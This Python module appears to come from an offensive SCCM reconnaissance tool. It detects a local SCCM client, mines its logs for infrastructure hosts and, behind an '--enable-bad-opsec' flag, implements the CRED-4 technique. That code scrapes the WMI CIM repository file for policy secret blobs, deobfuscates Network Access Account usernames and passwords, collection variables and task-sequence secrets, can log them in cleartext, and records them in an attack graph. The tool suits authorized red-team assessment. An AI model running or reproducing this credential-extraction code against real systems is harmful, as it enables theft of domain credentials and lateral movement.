"""
Local collection for ConfigManBearPig.

Translated from PowerShell Invoke-LocalCollection (lines 3889-4410).

Collects SCCM information from the local system:
- WMI namespace detection (root\\ccm)
- SMS_Authority WMI class
- SMS_LookupMP WMI class
- CCM_Client properties
- NAA (Network Access Account) detection
- Log file parsing for UNC paths and URLs

When --enable-bad-opsec is set (CRED-4, Misconfiguration-Manager):
Scrapes the CIM repository file (OBJECTS.DATA) for historic SCCM
policy secrets (NAA credentials, collection variables, task sequences)
that persist on disk even after being cleared from active WMI.
"""

import logging
import os
import re
import platform
from typing import Any, Optional

from lib.graph import GraphStore
from lib.targets import TargetManager

logger = logging.getLogger("ConfigManBearPig")

# CIM repository file paths (may vary on Windows Server vs Client)
_CIM_REPOSITORY_PATHS = [
    os.path.join(os.environ.get("SystemRoot", "C:\\Windows"),
                 "System32", "wbem", "Repository", "OBJECTS.DATA"),
    os.path.join(os.environ.get("SystemRoot", "C:\\Windows"),
                 "System32", "wbem", "Repository", "FS", "OBJECTS.DATA"),
]

# Patterns used to find SCCM policy secret blobs in CIM binary data.
# The CIM repository stores WMI objects as UTF-16LE strings.
# SCCM policy secrets are in XML CDATA sections with hex-encoded blobs:
#   <PolicySecret Version="1"><![CDATA[0601...]]>
# The hex blobs start with known cipher prefixes:
#   8913... = 3DES obfuscation
#   8A13... = AES-256 obfuscation
_POLICY_SECRET_CDATA_PATTERN = re.compile(
    rb'<!\[CDATA\[([0-9A-Fa-f]{64,})\]\]>',
)

# Known WMI class/property names that hold SCCM secrets (UTF-16LE encoded)
_SECRET_PROPERTY_NAMES = [
    "NetworkAccessUsername",
    "NetworkAccessPassword",
    "TS_Sequence",
    "CollectionVariable",
]


def invoke_local_collection(
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    enable_bad_opsec: bool = False,
    show_cleartext_passwords: bool = False,
    disable_possible_edges: bool = False,
    ad_resolver: Any = None,
) -> None:
    """
    Run Local collection phase.

    Translated from PowerShell Invoke-LocalCollection (lines 3889-4410).

    Checks the local system for SCCM client presence and configuration.
    When enable_bad_opsec=True, also scrapes CIM repository (CRED-4).
    """
    logger.info("Starting Local collection...")

    # This collector only makes sense on Windows
    if platform.system() != "Windows":
        logger.info("Local collection only supported on Windows (SCCM client detection)")
        logger.info("Skipping local collection on non-Windows platform")
        return

    # Check for SCCM client presence and get local site code
    local_site_code = _detect_sccm_client(graph, target_manager, domain)

    # Parse SCCM log files for infrastructure indicators
    _parse_sccm_logs(graph, target_manager, domain)

    # CRED-4: Scrape CIM repository for historic policy secrets
    if enable_bad_opsec:
        _scrape_cim_repository(
            graph, target_manager, domain, show_cleartext_passwords,
            ad_resolver=ad_resolver, site_code=local_site_code,
        )

    logger.info("Local collection completed")


def _detect_sccm_client(
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> Optional[str]:
    """
    Detect SCCM client installation on the local system.

    Checks:
    - WMI namespace root\\ccm
    - SCCM client directory (C:\\Windows\\CCM)
    - Registry keys

    Returns:
        The local SCCM assigned site code, or None.
    """
    # Check for CCM directory
    ccm_dir = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "CCM")
    if os.path.isdir(ccm_dir):
        logger.info("SCCM client detected (CCM directory exists)")
    else:
        logger.info("SCCM client not detected on local system")
        return None

    # Try to read SMS authority from registry or WMI
    # On Linux/Python we can't use WMI directly, so check for log files
    try:
        return _check_sccm_registry(graph, target_manager, domain)
    except Exception as e:
        logger.debug(f"Registry check failed: {e}")
        return None


def _check_sccm_registry(
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> Optional[str]:
    """Check local registry for SCCM configuration. Returns site code or None."""
    try:
        import winreg

        # Read assigned site code
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\SMS\Mobile Client",
        )
        site_code, _ = winreg.QueryValueEx(key, "AssignedSiteCode")
        winreg.CloseKey(key)

        if site_code:
            logger.info(f"Local SCCM assigned site: {site_code}")
            graph.upsert_node(
                site_code,
                ["SCCM_Site"],
                properties={
                    "collectionSource": ["Local-Registry"],
                    "SCCMInfra": True,
                    "siteCode": site_code,
                },
            )

        # Read management point
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\SMS\Client\Sites",
            )
            mp, _ = winreg.QueryValueEx(key, f"SMS:{site_code}")
            winreg.CloseKey(key)
            if mp:
                logger.info(f"Local management point: {mp}")
                target_manager.add_device(mp, source="Local-Registry")
        except (FileNotFoundError, OSError):
            pass

        return site_code if site_code else None

    except ImportError:
        logger.debug("winreg not available (non-Windows platform)")
        return None
    except (FileNotFoundError, OSError) as e:
        logger.debug(f"SCCM registry key not found: {e}")
        return None


def _parse_sccm_logs(
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> None:
    """
    Parse SCCM log files for infrastructure indicators.

    Translated from PowerShell log parsing (lines 4270-4410).
    Looks for UNC paths and URLs that reveal SCCM infrastructure.
    """
    log_dirs = [
        os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "CCM", "Logs"),
        os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "CCMSetup", "Logs"),
        os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "SMSCFG.ini"),
    ]

    # Patterns to look for
    url_pattern = re.compile(r"https?://([a-zA-Z0-9\-\.]+(?:\.\w+)+)", re.IGNORECASE)
    unc_pattern = re.compile(r"\\\\([a-zA-Z0-9\-\.]+(?:\.\w+)+)\\", re.IGNORECASE)
    mp_pattern = re.compile(r"(?:MP|ManagementPoint)\s*[:=]\s*([a-zA-Z0-9\-\.]+)", re.IGNORECASE)

    discovered_hosts: set[str] = set()

    for log_dir in log_dirs:
        if not os.path.exists(log_dir):
            continue

        if os.path.isfile(log_dir):
            _parse_log_file(log_dir, url_pattern, unc_pattern, mp_pattern, discovered_hosts)
        elif os.path.isdir(log_dir):
            try:
                for filename in os.listdir(log_dir):
                    if filename.endswith(".log"):
                        filepath = os.path.join(log_dir, filename)
                        _parse_log_file(filepath, url_pattern, unc_pattern, mp_pattern, discovered_hosts)
            except PermissionError:
                logger.debug(f"Permission denied reading log directory: {log_dir}")

    # Add discovered hosts as targets
    for host in discovered_hosts:
        if host.lower().endswith(f".{domain.lower()}"):
            target_manager.add_device(host, source="Local-LogParsing")
            logger.info(f"Discovered host from logs: {host}")


def _parse_log_file(
    filepath: str,
    url_pattern: re.Pattern,
    unc_pattern: re.Pattern,
    mp_pattern: re.Pattern,
    discovered_hosts: set[str],
) -> None:
    """Parse a single log file for hostnames."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                for match in url_pattern.finditer(line):
                    discovered_hosts.add(match.group(1))
                for match in unc_pattern.finditer(line):
                    discovered_hosts.add(match.group(1))
                for match in mp_pattern.finditer(line):
                    discovered_hosts.add(match.group(1))
    except (PermissionError, OSError):
        pass


# ------------------------------------------------------------------ #
#  CRED-4: CIM Repository Scraping
# ------------------------------------------------------------------ #

def _scrape_cim_repository(
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    show_cleartext_passwords: bool,
    ad_resolver: Any = None,
    site_code: Optional[str] = None,
) -> None:
    """
    CRED-4: Extract historic SCCM policy secrets from the CIM repository.

    The CIM repository (OBJECTS.DATA) stores WMI objects as serialized
    binary data. SCCM policy secrets (NAA credentials, collection variables,
    task sequences) persist in this file even after being cleared from
    active WMI, making it a source of legacy credentials.

    The secrets are stored as hex-encoded obfuscated blobs within XML
    CDATA sections, using the same format as policy responses from the
    management point (3DES or AES-256 obfuscation).

    Requires local administrator privileges.
    """
    logger.info("CRED-4: Scanning CIM repository for historic SCCM secrets...")

    objects_data_path = None
    for path in _CIM_REPOSITORY_PATHS:
        if os.path.isfile(path):
            objects_data_path = path
            break

    if objects_data_path is None:
        logger.info("CRED-4: CIM repository OBJECTS.DATA not found")
        return

    try:
        file_size = os.path.getsize(objects_data_path)
        logger.info(f"CRED-4: Reading CIM repository ({file_size / 1024 / 1024:.1f} MB): {objects_data_path}")

        # Read in chunks to handle large files (can be hundreds of MB)
        blobs = _extract_policy_blobs_from_cim(objects_data_path)

        if not blobs:
            logger.info("CRED-4: No SCCM policy secret blobs found in CIM repository")
            return

        logger.info(f"CRED-4: Found {len(blobs)} potential policy secret blob(s)")

        # Attempt deobfuscation
        _deobfuscate_cim_blobs(
            blobs=blobs,
            graph=graph,
            target_manager=target_manager,
            domain=domain,
            show_cleartext_passwords=show_cleartext_passwords,
            ad_resolver=ad_resolver,
            site_code=site_code,
        )

    except PermissionError:
        logger.warning("CRED-4: Permission denied reading OBJECTS.DATA (requires local admin)")
    except OSError as e:
        logger.warning(f"CRED-4: Failed to read CIM repository: {e}")


def _extract_policy_blobs_from_cim(
    file_path: str,
    chunk_size: int = 4 * 1024 * 1024,  # 4 MB chunks
) -> list[dict[str, str]]:
    """
    Extract SCCM policy secret blobs from a CIM repository file.

    Reads the binary file in chunks and searches for:
    1. CDATA sections containing hex-encoded policy secret blobs
    2. Nearby context (property names) to identify what each blob contains

    Returns list of dicts with keys: hex_blob, context (property name hint)
    """
    results: list[dict[str, str]] = []
    seen_blobs: set[str] = set()  # Deduplicate by first 64 chars of hex

    # The CIM file contains both ASCII and UTF-16LE encoded strings.
    # Policy secrets appear in both encodings depending on the WMI version.
    # We search the raw binary for the CDATA pattern in both encodings.

    # Build regex for ASCII CDATA pattern
    ascii_cdata_pattern = re.compile(
        rb'<!\[CDATA\[([0-9A-Fa-f]{64,}?)\]\]>',
    )

    # Build UTF-16LE pattern for CDATA (each ASCII char has a \x00 after it)
    # <![CDATA[ in UTF-16LE: <\x00!\x00[\x00C\x00D\x00A\x00T\x00A\x00[\x00
    utf16_cdata_start = b'<\x00!\x00[\x00C\x00D\x00A\x00T\x00A\x00[\x00'
    utf16_cdata_end = b']\x00]\x00>\x00'

    # Also search for standalone hex blobs with known policy secret prefixes
    # 8913 = 3DES, 8A13 = AES-256 (first 2 bytes of obfuscated blob)
    hex_blob_pattern = re.compile(
        rb'(?:8[9Aa]13[0-9A-Fa-f]{60,})',
    )

    # Context patterns to identify secret type
    context_patterns = {
        b'NetworkAccessUsername': 'NetworkAccessUsername',
        b'NetworkAccessPassword': 'NetworkAccessPassword',
        b'CCM_NetworkAccessAccount': 'NetworkAccessAccount',
        b'CCM_TaskSequence': 'TaskSequence',
        b'CollectionVariable': 'CollectionVariable',
    }
    # UTF-16LE versions
    for key in list(context_patterns.keys()):
        utf16_key = key.decode('ascii').encode('utf-16-le')
        context_patterns[utf16_key] = context_patterns[key]

    overlap = 8192  # Overlap between chunks to catch blobs at boundaries
    prev_tail = b''

    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break

            # Combine with previous chunk's tail for boundary matching
            search_data = prev_tail + chunk
            prev_tail = chunk[-overlap:] if len(chunk) >= overlap else chunk

            # Find context hints in this region
            region_context = "unknown"
            for ctx_bytes, ctx_name in context_patterns.items():
                if ctx_bytes in search_data:
                    region_context = ctx_name

            # Search for ASCII CDATA blobs
            for match in ascii_cdata_pattern.finditer(search_data):
                hex_blob = match.group(1).decode('ascii', errors='ignore')
                blob_key = hex_blob[:64]
                if blob_key not in seen_blobs:
                    seen_blobs.add(blob_key)
                    # Determine context from nearby bytes
                    context = region_context
                    nearby = search_data[max(0, match.start() - 512):match.start()]
                    for ctx_bytes, ctx_name in context_patterns.items():
                        if ctx_bytes in nearby:
                            context = ctx_name
                            break
                    results.append({"hex_blob": hex_blob, "context": context})

            # Search for UTF-16LE CDATA blobs
            start_idx = 0
            while True:
                start_pos = search_data.find(utf16_cdata_start, start_idx)
                if start_pos == -1:
                    break
                content_start = start_pos + len(utf16_cdata_start)
                end_pos = search_data.find(utf16_cdata_end, content_start)
                if end_pos == -1:
                    break
                raw_content = search_data[content_start:end_pos]
                # Decode UTF-16LE hex digits
                try:
                    hex_blob = raw_content.decode('utf-16-le')
                    if len(hex_blob) >= 64 and all(c in '0123456789ABCDEFabcdef' for c in hex_blob[:32]):
                        blob_key = hex_blob[:64]
                        if blob_key not in seen_blobs:
                            seen_blobs.add(blob_key)
                            context = region_context
                            nearby = search_data[max(0, start_pos - 512):start_pos]
                            for ctx_bytes, ctx_name in context_patterns.items():
                                if ctx_bytes in nearby:
                                    context = ctx_name
                                    break
                            results.append({"hex_blob": hex_blob, "context": context})
                except (UnicodeDecodeError, ValueError):
                    pass
                start_idx = end_pos + len(utf16_cdata_end)

            # Search for standalone hex blobs with policy secret prefixes
            for match in hex_blob_pattern.finditer(search_data):
                hex_blob = match.group(0).decode('ascii', errors='ignore')
                if len(hex_blob) >= 128:
                    blob_key = hex_blob[:64]
                    if blob_key not in seen_blobs:
                        seen_blobs.add(blob_key)
                        context = region_context
                        nearby = search_data[max(0, match.start() - 512):match.start()]
                        for ctx_bytes, ctx_name in context_patterns.items():
                            if ctx_bytes in nearby:
                                context = ctx_name
                                break
                        results.append({"hex_blob": hex_blob, "context": context})

    return results


def _deobfuscate_cim_blobs(
    blobs: list[dict[str, str]],
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    show_cleartext_passwords: bool,
    ad_resolver: Any = None,
    site_code: Optional[str] = None,
) -> None:
    """
    Attempt to deobfuscate SCCM policy secret blobs extracted from CIM.

    Uses deobfuscate_secret_policy_blob() from sccm_crypto, which handles
    both 3DES (0x8913) and AES-256 (0x8A13) obfuscation formats.
    """
    try:
        from lib.sccm_crypto import deobfuscate_secret_policy_blob
    except ImportError:
        logger.warning("CRED-4: sccm_crypto not available for deobfuscation")
        return

    naa_usernames: list[str] = []
    naa_passwords: list[str] = []
    collection_vars: list[str] = []
    task_sequences: list[str] = []
    successful = 0

    for blob_info in blobs:
        hex_blob = blob_info["hex_blob"]
        context = blob_info["context"]

        plaintext = deobfuscate_secret_policy_blob(hex_blob)
        if plaintext is None:
            continue

        successful += 1

        if context == "NetworkAccessUsername" or (
            context in ("NetworkAccessAccount", "unknown") and "\\" in plaintext
        ):
            naa_usernames.append(plaintext)
            if show_cleartext_passwords:
                logger.info(f"CRED-4: Found NAA username: {plaintext}")
            else:
                logger.info("CRED-4: Found NAA username (use --show-cleartext-passwords)")
        elif context == "NetworkAccessPassword":
            naa_passwords.append(plaintext)
            if show_cleartext_passwords:
                logger.info(f"CRED-4: Found NAA password: {plaintext}")
            else:
                logger.info("CRED-4: Found NAA password (use --show-cleartext-passwords)")
        elif context == "CollectionVariable":
            collection_vars.append(plaintext)
            logger.info(f"CRED-4: Found collection variable secret")
        elif context == "TaskSequence":
            task_sequences.append(plaintext)
            logger.info(f"CRED-4: Found task sequence secret")
        else:
            # Unknown context - try to classify by content
            if "\\" in plaintext and len(plaintext) < 200:
                naa_usernames.append(plaintext)
                if show_cleartext_passwords:
                    logger.info(f"CRED-4: Found credential: {plaintext}")
                else:
                    logger.info("CRED-4: Found credential (use --show-cleartext-passwords)")
            else:
                if show_cleartext_passwords:
                    logger.info(f"CRED-4: Decrypted secret ({len(plaintext)} chars): {plaintext[:100]}")
                else:
                    logger.info(f"CRED-4: Decrypted secret ({len(plaintext)} chars)")

    if successful == 0:
        logger.info("CRED-4: No policy secrets could be deobfuscated from CIM repository")
        return

    logger.info(
        f"CRED-4: Deobfuscated {successful} secret(s): "
        f"{len(naa_usernames)} usernames, {len(naa_passwords)} passwords, "
        f"{len(collection_vars)} collection vars, {len(task_sequences)} task sequences"
    )

    # Create graph nodes for discovered credentials
    from lib.secret_utils import (
        create_secret_node,
        extract_domain_users,
        resolve_and_create_secret_user,
    )

    # Pair NAA usernames and passwords (they're typically stored in sequence)
    for i, username in enumerate(naa_usernames):
        password = naa_passwords[i] if i < len(naa_passwords) else None
        # Username is a DOMAIN\user — create AD-resolved User node
        resolve_and_create_secret_user(
            ad_resolver, graph, username, "NAA", site_code, "Local-CRED4",
            extra_props={"isHistoric": True},
        )
        # Password is a non-domain secret — create SCCM_Secret node
        if password:
            create_secret_node(
                graph, "NAA_Password", password, site_code, "Local-CRED4",
                name="NAA Password", show_cleartext=show_cleartext_passwords,
                extra_props={"isHistoric": True},
            )

    # Collection variables — extract domain users or create secret nodes
    for cv_value in collection_vars:
        domain_users = extract_domain_users(cv_value)
        for du in domain_users:
            resolve_and_create_secret_user(
                ad_resolver, graph, du, "CollectionVariable", site_code,
                "Local-CRED4", extra_props={"isHistoric": True},
            )
        if not domain_users and cv_value:
            create_secret_node(
                graph, "CollectionVariable", cv_value, site_code, "Local-CRED4",
                show_cleartext=show_cleartext_passwords,
                extra_props={"isHistoric": True},
            )

    # Task sequences — extract domain users or create secret nodes
    for ts_value in task_sequences:
        domain_users = extract_domain_users(ts_value)
        for du in domain_users:
            resolve_and_create_secret_user(
                ad_resolver, graph, du, "TaskSequence", site_code,
                "Local-CRED4", extra_props={"isHistoric": True},
            )
        if not domain_users and ts_value:
            create_secret_node(
                graph, "TaskSequence", ts_value, site_code, "Local-CRED4",
                name="Task Sequence Script", show_cleartext=show_cleartext_passwords,
                extra_props={"isHistoric": True},
            )
